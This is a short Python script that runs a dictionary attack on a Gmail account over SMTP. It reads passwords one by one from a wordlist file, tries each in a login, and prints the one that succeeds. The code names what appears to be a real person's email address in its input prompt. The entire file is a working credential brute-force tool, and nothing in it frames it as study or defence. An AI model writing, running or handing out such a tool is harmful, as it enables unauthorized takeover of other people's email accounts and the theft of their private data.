import smtplib


def main():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    user = input("sithara.munasinghe12@gmail.com")
    passwfile = input("password.text")
    passwfile = open(passwfile, "r")

    for password in passwfile:
        try:
            smtpserver.login(user, password)
            print("[+] Password Found: %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("[!] Password Incorrect: %s" % password)

if __name__ == "__main__":
    main()
